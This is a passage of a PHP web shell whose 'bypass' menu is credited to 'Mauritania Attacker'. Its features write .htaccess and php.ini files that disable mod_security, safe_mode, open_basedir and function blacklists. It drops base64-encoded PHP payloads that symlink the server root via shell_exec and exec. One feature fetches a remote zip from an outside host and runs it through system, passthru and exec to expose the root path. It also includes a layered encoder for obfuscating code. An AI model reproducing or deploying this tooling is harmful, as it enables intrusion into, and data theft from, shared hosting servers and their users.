$hwrite = fwrite($kolsv, $htaccess);
if($hwrite){
echo ".htaccess Generated Successfully \!/";
} else {
echo "Can't Generate Htaccess";
}
fclose($kolsv);
#Generate ini.php
$xopen = fopen("ghost/ini.php",'w');
$rim = @file_get_contents($mauritania);
$zzz = fwrite($xopen ,$rim);
if($zzz){
echo "ini.php Has Been Downloaded \!/";
} else {
echo "Can't Download ini.php :( do it manually :D ";
}
fclose($xopen);
	
$ini = fopen("ghost/php.ini" ,"w");
$php = fwrite($ini, base64_decode($phpini));
if($php){
echo "PHP.INI Generated Successfully \!/";
} else {
echo "[-] Can't Generate PHP.INI";
}
}
echo "</textarea></center>";
}
?>
<?}elseif($_GET['do'] == 'setphr') {?>	
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass suPHP Security</span><center><br>';
echo '<center><form method=post><br><br>
<input type=submit name=gnr value="Generate htaccess" /></form></center>';
          
error_reporting(0);
            
if(isset($_POST['gnr']))
{
mkdir('suPHP',0755);
$rr  = "<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
SecFilterCheckURLEncoding Off 
SecFilterCheckCookieFormat Off 
SecFilterCheckUnicodeEncoding Off 
SecFilterNormalizeCookies Off 
</IfModule> 
<Limit GET POST> 
order deny,allow 
deny from all 
allow from all 
</Limit> 
<Limit PUT DELETE> 
order deny,allow 
deny from all 
</Limit> 
suPHP_ConfigPath ".getcwd()."/php.ini";
$g = fopen('suPHP/.htaccess','w');
fwrite($g,$rr);
echo "<br><br><font color=red size=2 face=\"Courier New\">.htaccess Has Been Generated Successfully</font></center><br><br>";
echo "<center><br><b class='cone'><a href=suPHP/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
}
echo '<center><form method=post><br><br>
<input type=submit name=gnrp value="Generate php.ini" /></form></center>';
error_reporting(0);
            
if(isset($_POST['gnrp']))
{
mkdir('suPHP',0755);
$rr  = "safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.func.blacklist = NONE";
$g = fopen('suPHP/php.ini','w');
fwrite($g,$rr);
echo "<br><br><font color=red size=2 face=\"Courier New\">php.ini Has Been Generated Successfully</font></center><br><br>";
echo "<center><br><b class='cone'><a href=suPHP/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
		
}
}
?>
<?}elseif($_GET['do'] == 'suppet') {?>	
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Functions suPHP_ConfigPath Security</span><center><br>';
echo '<center><form method=post><br><br>
<input type=submit name=gnr value="Generate htaccess" /></form></center>';
          
error_reporting(0);
            
if(isset($_POST['gnr']))
{
mkdir('suPHP2',0755);
$rr  = "<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
SecFilterCheckURLEncoding Off 
SecFilterCheckCookieFormat Off 
SecFilterCheckUnicodeEncoding Off 
SecFilterNormalizeCookies Off 
</IfModule> 
<Limit GET POST> 
order deny,allow 
deny from all 
allow from all 
</Limit> 
<Limit PUT DELETE> 
order deny,allow 
deny from all 
</Limit> 
suPHP_ConfigPath ".getcwd()."/php.ini";
$g = fopen('suPHP2/.htaccess','w');
fwrite($g,$rr);
echo "<br><br><font color=red size=2 face=\"Courier New\">.htaccess Has Been Generated Successfully</font></center><br><br>";
echo "<center><br><b class='cone'><a href=suPHP2/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
}
echo '<center><form method=post><br><br>
<input type=submit name=gnrp value="Generate php.ini" /></form></center>';
error_reporting(0);
            
if(isset($_POST['gnrp']))
{
mkdir('suPHP2',0755);
$rr  = "safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF";
$g = fopen('suPHP2/php.ini','w');
fwrite($g,$rr);
echo "<br><br><font color=red size=2 face=\"Courier New\">php.ini Has Been Generated Successfully</font></center><br><br>";
echo "<center><br><b class='cone'><a href=suPHP2/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
		
}
}
?>
<?}elseif($_GET['do'] == 'rootshelleexecbpass') {?>	
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path With shell_exec Function</span><center><br>';
mkdir('shellexcexce', 0755);
chdir('shellexcexce');
$shellexcexce = 'PGhlYWQ+DQo8dGl0bGU+QnlwYXNzIEJ5cGFzcyBSb290IFBhdGggYnkgTWF1cml0YW5pYSBBdHRhY2tlcjwvdGl0bGU+DQo8L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPjwhLS0gYm9keSB7YmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7IGZvbnQtZmFtaWx5OkNvdXJpZXIJbWFyZ2luLWxlZnQ6IDBweDsgbWFyZ2luLXRvcDogMHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IE5ldztmb250LXNpemU6MTJweDtjb2xvcjojMDA4ODAwO2ZvbnQtd2VpZ2h0OjQwMDt9IGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fSBhOmxpbmsge2NvbG9yOiMwMDk5MDA7fSBhOnZpc2l0ZWQge2NvbG9yOiMwMDg4MDA7fSBhOmhvdmVye2NvbG9yOiMwMGJiMDA7fSBhOmFjdGl2ZSB7Y29sb3I6IzAwOTkwMDt9IC0tPjwhLS0gTWFkZSBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIC0tPg0KPC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgDQplY2hvICI8Y2VudGVyPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdCeXBhc3MgaXQnIG5hbWU9J3NoZWxsX2V4ZWNlcic+PC9jZW50ZXI+IjsgDQppZiAoaXNzZXQoJF9QT1NUWydzaGVsbF9leGVjZXInXSkpeyBzaGVsbF9leGVjKCdsbiAtcyAvIHJvb3Qtc2hlbGxfZXhlYy50eHQnKTsgDQokZnZja2VtID0nVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCemMzTnpjM011YUhSdERRcEJaR1JVZVhCbElIUjRkQ0F1Y0dod0RRcEJaR1JJWVc1a2JHVnlJSFI0ZENBdWNHaHcnOyANCiRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkc2hlbGxfZXhlY2VyID0gc3ltbGluaygiLyIsInJvb3Qtc2hlbGxfZXhlYy50eHQiKTsgDQokcnQ9Ijxicj48YSBocmVmPXJvb3Qtc2hlbGxfZXhlYy50eHQgVEFSR0VUPSdfYmxhbmsnPjxmb250IGNvbG9yPSMwMGJiMDAgc2l6ZT0yIGZhY2U9J0NvdXJpZXIgTmV3Jz48Yj5CeXBhc3NlZCBTdWNjZXNzZnVsbHk8L2I+PC9mb250PjwvYT4iOyANCmVjaG8gIjxicj48YnI+PGI+RG9uZS4uICE8L2I+PGJyPjxicj5DaGVjayBsaW5rIGdpdmVuIGJlbG93IGZvciAvIGZvbGRlciBzeW1saW5rIDxicj4kcnQ8L2NlbnRlcj4iO30gZWNobyAiPC9mb3JtPiI7ICA/PjwvdGQ+PC90cj48L2JvZHk+PC9odG1sPg==';

$file = fopen("shellexcexce.php" ,"w+");
$write = fwrite ($file ,base64_decode($shellexcexce));
fclose($file);
chmod("shellexcexce.php",0755);
echo "<iframe src=shellexcexce/shellexcexce.php width=60% height=60% frameborder=0></iframe>";
}

?>
	
<?}elseif($_GET['do'] == 'rootexecbpass') {?>	
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path With exec Function</span><center><br>';
mkdir('excrooooot', 0755);
chdir('excrooooot');
$excrooooot = 'PGhlYWQ+DQo8dGl0bGU+QnlwYXNzIEJ5cGFzcyBSb290IFBhdGggYnkgTWF1cml0YW5pYSBBdHRhY2tlcjwvdGl0bGU+DQo8L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPjwhLS0gYm9keSB7YmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7IGZvbnQtZmFtaWx5OkNvdXJpZXIJbWFyZ2luLWxlZnQ6IDBweDsgbWFyZ2luLXRvcDogMHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IE5ldztmb250LXNpemU6MTJweDtjb2xvcjojMDA4ODAwO2ZvbnQtd2VpZ2h0OjQwMDt9IGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fSBhOmxpbmsge2NvbG9yOiMwMDk5MDA7fSBhOnZpc2l0ZWQge2NvbG9yOiMwMDg4MDA7fSBhOmhvdmVye2NvbG9yOiMwMGJiMDA7fSBhOmFjdGl2ZSB7Y29sb3I6IzAwOTkwMDt9IC0tPjwhLS0gTWFkZSBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIC0tPg0KPC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgDQplY2hvICI8Y2VudGVyPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdCeXBhc3MgaXQnIG5hbWU9J2V4ZWNlcic+PC9jZW50ZXI+IjsgDQppZiAoaXNzZXQoJF9QT1NUWydleGVjZXInXSkpeyBleGVjKCdsbiAtcyAvIHJvb3QtZXhlYy50eHQnKTsgDQokZnZja2VtID0nVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCemMzTnpjM011YUhSdERRcEJaR1JVZVhCbElIUjRkQ0F1Y0dod0RRcEJaR1JJWVc1a2JHVnlJSFI0ZENBdWNHaHcnOyANCiRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkZXhlY2VyID0gc3ltbGluaygiLyIsInJvb3QtZXhlYy50eHQiKTsgDQokcnQ9Ijxicj48YSBocmVmPXJvb3QtZXhlYy50eHQgVEFSR0VUPSdfYmxhbmsnPjxmb250IGNvbG9yPSMwMGJiMDAgc2l6ZT0yIGZhY2U9J0NvdXJpZXIgTmV3Jz48Yj5CeXBhc3NlZCBTdWNjZXNzZnVsbHk8L2I+PC9mb250PjwvYT4iOyANCmVjaG8gIjxicj48YnI+PGI+RG9uZS4uICE8L2I+PGJyPjxicj5DaGVjayBsaW5rIGdpdmVuIGJlbG93IGZvciAvIGZvbGRlciBzeW1saW5rIDxicj4kcnQ8L2NlbnRlcj4iO30gZWNobyAiPC9mb3JtPiI7ICA/PjwvdGQ+PC90cj48L2JvZHk+PC9odG1sPg==';

$file = fopen("excrooooot.php" ,"w+");
$write = fwrite ($file ,base64_decode($excrooooot));
fclose($file);
chmod("excrooooot.php",0755);
echo "<iframe src=excrooooot/excrooooot.php width=60% height=60% frameborder=0></iframe>";
}

?>


<?}elseif($_GET['do'] == 'bypsrootwzp') {?>	
<?{
echo"<center><h1>Yeah Let's Try Bypass This Server And Smile</h1><br><img src=https://media.giphy.com/media/cGrCQk6zbsvLO/giphy.gif><br><br>";		
echo '<center><div id="menu">';		
echo "<a href='?dir=$dir&do=grasy'>Bypass /etc/passwd</a><br><br>";
echo "<a href='?dir=$dir&do=nemcon'>Bypass Users Server</a><br><br>";
echo "<a href='?dir=$dir&do=cgipl'>Bypass Perl Security</a><br><br>";
echo "<a href='?dir=$dir&do=bypsrootwzp'>Bypass Root Path with Zip File</a><br><br>";
echo "<a href='?dir=$dir&do=bforb'>Bypass Root Path with system function</a><br><br>";
echo "<a href='?dir=$dir&do=rootexecbpass'>Bypass Root Path with exec function</a><br><br>";
echo "<a href='?dir=$dir&do=rootshelleexecbpass'>Bypass Root Path with shell_exec function</a><br><br>";
echo "<a href='?dir=$dir&do=posget'>Bypass posix_getpwuid</a><br><br>";
echo "<a href='?dir=$dir&do=suphp'>Bypass PHP Suhosin function blacklist</a><br><br>";
echo "<a href='?dir=$dir&do=suppet'>Bypass Functions suPHP_ConfigPath</a><br><br>";
echo "<a href='?dir=$dir&do=setphr'>Bypass suPHP Security</a><br><br>";
echo "<a href='?dir=$dir&do=simpelb'>Simple Bypasser</a><br><br>";
echo "<a href='?dir=$dir&do=ritf'>Read Files</a><br><br>";
echo "<a href='?dir=$dir&do=baidir'>Bypass Chmod Directory</a><br><br>";
echo "<a href='?dir=$dir&do=smod14'>Bypass SafeMode 2014 Priv8</a><br><br>";
echo'<center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Bypass Root Path With Zip File</span><br>Coded By Mauritania Attacker</center>';
echo"<p align='center'><img border='0' src='http://4.bp.blogspot.com/-B2RRd3iYCgI/Uj6UtLxxApI/AAAAAAAAATc/DJHEPAWNTmk/s320/Password-protected-zip-file.png'></p>";
echo'<div class="tul"><font color="009900" face="Impact, Geneva, sans-serif" style="font-size: 8pt"><font/>';

echo"<center><font face='ghost' color='red' size='5'><font/>
<form method='post'>
<input type='submit' value='Grab To Root Now' name='fuck'><br>
<center><font color='red' size='4' face='ghost'>Remote Zip File</font><input type='text' size='40' name='shell' value='http://hcp1.es/wp-content/uploads/v4.zip' 
</font></center>
</form>
</center>
</p>";


@error_reporting(0);

$file = $_POST['shell'];
//Generate zip file
mkdir('wooooot', 0755);
chdir('wooooot');
$fopen = fopen("v4.zip",'w');
$shell = @file_get_contents($file);
$swrite = fwrite($fopen ,$shell);
if($swrite){
echo "Zip File Downloaded Successfully\n";
sleep(2);
echo "<p>Going To Unzip the File to Get r00t....</p>";

sleep(2); 

//system
system('unzip v4.zip');



//passthru
passthru('unzip v4.zip');



//shell_exec
shell_exec('unzip v4.zip');



//exec
exec('unzip v4.zip');


//proc_open
proc_open('unzip v4.zip');




sleep(1);

//Extracting htaccess For Symlink
chdir('wooooot');
$htaccess = 'T1BUSU9OUyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzIFN5bUxpbmtzSWZPd25lck1hdGNoIEluY2x1ZGVzIEluY2x1ZGVzTk9FWEVDIEV4ZWNDR0kNCk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcw0KRm9yY2VUeXBlIHRleHQvcGxhaW4NCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIA0KQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sDQpBZGRUeXBlIHRleHQvaHRtbCAuc2h0bWwNCkFkZFR5cGUgdHh0IC5waHANCkFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAuaHRtbA0KQWRkSGFuZGxlciB0eHQgLnNodG1sDQpPcHRpb25zIEFsbA0KT3B0aW9ucyBBbGw=';
$priv8priv = fopen(".htaccess" ,"w+");
$xwrite = fwrite ($priv8priv ,base64_decode($htaccess));

sleep(1);

echo "<p>Loading Perl unzipper.... \!/ </p>";
//dezipper.pl generate
chdir('wooooot');
$l0vercodee = 'eyANCnN5c3RlbSgidW56aXAgdjQuemlwIik7DQpleGVjKCJ1bnppcCB2NC56aXAiKTsNCnBhc3N0aHJ1KCJ1bnppcCB2NC56aXAiKTsNCnNoZWxsX2V4ZWMoInVuemlwIHY0LnppcCIpOw0KcHJvY19vcGVuKCJ1bnppcCB2NC56aXAiKTsNCn0=';
$greatshiit = fopen("dezipper.pl" ,"w+");
$write = fwrite ($greatshiit ,base64_decode($l0vercodee));
if($write){
echo "<p>Perl Unzipper Downloaded Successfully</p>";
fclose($greatshiit);
chmod("dezipper.pl",0755);

echo "<p>Unzipping File with Perl \!/ </p>";

system('perl dezipper.pl');
passthru('perl dezipper.pl');
shell_exec('perl dezipper.pl');
exec('perl dezipper.pl');
proc_open('perl dezipper.pl');

echo"<br><a href=wooooot/1.txt TARGET='_blank'>Link=====><font color=red size=3 face='Courier New'><b>Root Path</b></font></a>";

}
}
}


?>
<?// ==== AKHIR DARI FITUR BYPASS SERVER ==== //?>


<?php
} elseif($_GET['do'] == 'ende') {

@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$text = $_POST['mbutt'];
?>
<body >
<center>
<br>
<form method="post"><br>
<textarea class='inputz' cols=30 rows=5 name="mbutt" style="background:transparent;color:aqua;"></textarea><br><br>
<select class='inputz' size="1" name="ope" style="background:red;color:aqua;">
<option style='background:transparent;color:aqua;'><center>[#] Encryption [#]</option>
<option value="urlencode" style='background:transparent;color:aqua;'>url</option>
<option value="base64" style='background:transparent;color:aqua;'>Base64</option>
<option value="ur" style='background:transparent;color:aqua;'>convert_uu</option>
<option value="json" style='background:transparent;color:aqua;'>json</option>
<option value="gzinflates" style='background:transparent;color:aqua;'>gzinflate - base64</option>
<option value="str2" style='background:transparent;color:aqua;'>str_rot13 - base64</option>
<option value="gzinflate" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - base64</option>
<option value="gzinflater" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - base64</option>
<option value="gzinflatex" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew" style='background:transparent;color:aqua;'>str_rot13 - convert_uu - url - gzinflate - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
<option value="str" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url" style='background:transparent;color:aqua;'>base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value="hexencode" style='background:transparent;color:aqua;'>Hex Encode/Decode</option>
<option value="md5" style='background:transparent;color:aqua;'><center>MD5 Hash</option>
<option value="sha1" style='background:transparent;color:aqua;'>SHA1 Hash</option>
<option value="str_rot13" style='background:transparent;color:aqua;'>ROT13 Hash</option>
<option value="strlen" style='background:transparent;color:aqua;'>strlen</option>
<option value="xxx" style='background:transparent;color:aqua;'>unescape</option>
<option value="bbb" style='background:transparent;color:aqua;'>charAt</option>
<option value="aaa" style='background:transparent;color:aqua;'>chr - bin2hex - substr</option>
<option value="www" style='background:transparent;color:aqua;'>chr</option>
<option value="sss" style='background:transparent;color:aqua;'>htmlspecialchars</option>
<option value="eee" style='background:transparent;color:aqua;'>escape</option></select><br><input class='inputzbut' type='submit' name='submit' value='Encode' style="background:transparent;color:aqua;">
<input class='inputzbut' type='submit' name='crack' value='Decode' style="background:transparent;color:aqua;"><br>
</select>&nbsp;
</form>
<?php 
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'json' : $codi=json_encode(utf8_encode($text));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
break;case 'str2' : $codi=base64_encode(str_rot13($text));
break;case 'urlencode' : $codi=rawurlencode($text);
break;case 'hexencode' : $codi=bin2hex($text);
break;case 'md5' : $codi=md5($text);
break;case 'ur' : $codi=convert_uuencode($text);
break;case 'str_rot13' : $codi=str_rot13($text);
break;case 'sha1' : $codi=sha1($text);
break;case 'strlen' : $codi=strlen($text);
break;case 'xxx' : $codi=strlen(bin2hex($text));
break;case 'bbb' : $codi=htmlentities(utf8_decode($text));
break;case 'aaa' : $codi=chr(bin2hex(substr($text)));
break;case 'www' : $codi=chr($text);
break;case 'sss' : $codi=htmlspecialchars($text);
break;case 'eee' : $codi=addslashes($text);
break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;default:break;}}

$submit = $_POST['crack'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'json' : $codi=utf8_dencode(json_dencode($text));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'hexencode' : $codi=quoted_printable_decode($text);
break;case 'ur' : $codi=convert_uudecode($text);
break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
$html = htmlentities(stripslashes($codi));
echo "<from><center><h3><font size=4 face=chiller color=aqua>Garuda Security Hacker</h3></center><textarea cols=70 rows=20 style='onfocus();font-weight:bold;color:red;background-image: transparent;opacity:0.40;background-size:100%;background-repeat: no-repeat;' class='inputz' readonly>".$html."</textarea><BR/><BR/></center></from>";
?>
<footer style="text-shadow: 0 0 6px #FF0000, 0 0 5px #FF0000, 0 0 5px #FF0000; position:fixed; left:1px; right:0px; top:0px; border-bottom: 1px solid red ;">
<center><b><font face="Quicksand" color="black" size="3" style="text-shadow: 0 0 5px #2f2b2b, 0 0 10px #2f2b2b, 0 0 20px #2f2b2b, 0 0 45px #2f2b2b, 0 0 40px #2f2b2b;">
<font face="Agency FB" color="red" size="4" style="text-shadow: 0 0 6px black, 0 0 5px black, 0 0 5px black;"></footer>
<?php
	} elseif($_GET['do'] == 'shellscanner') {
?>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features)
}
//-->
</script>
<style type="text/css">
<!--
.single{
   border: 1px solid #00ff00;box-shadow: 0px 0px 15px #55FF55;
   padding: 5px;
}
.me  {
   font-size:11px; font-family:Tahoma,Verdana,Arial; color:#ccff99; 
   border: 0px;
   padding: 5px;
}

.isi{
   padding: 2px;
   border:1px solid #666666;
   font-family: Tahoma;
   color: #ccff99;
   background-color: #666666;
   font-size: 10px;
   font-weight: bold;
}
-->
</style>
<style type="text/css">
